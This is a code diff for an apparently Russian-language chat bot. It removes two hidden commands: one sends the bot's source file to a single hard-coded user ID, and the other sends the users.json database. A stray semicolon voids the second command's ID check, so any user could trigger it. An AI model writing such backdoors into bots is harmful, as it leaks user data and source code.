@@ -1119,23 +1119,6 @@ return message.send(`
 🆔Ид чата ${message.chatId}.`);
 });
 
-
-
-cmd.hear(/^(?:код|вытащить код|дай код)$/i, async (message, bot) => {
-if(message.senderId !== 528262675 && message.senderId !== 528262675) return message.send(`Ха соси`);
-message.sendDocument(__filename);
-return message.send(`НА НЕ РОНЯЙ ЕГО`)
-});
-
-cmd.hear(/^(?:кодбд)$/i, async (message, bot) => {
-if(message.senderId !== 528262675);
-message.sendDocument(users.json);
-return message.send(`бд`)
-});
-
-
-
-
 cmd.hear(/^(?:бизнесы)\s?([0-9]+)?$/i, async (message, bot) => {
 	if(!message.args[1]) return bot(`бизнесы:
 ${message.user.business === 1 ? '✅' : '❌'} 1. Кофе - 50.000₽
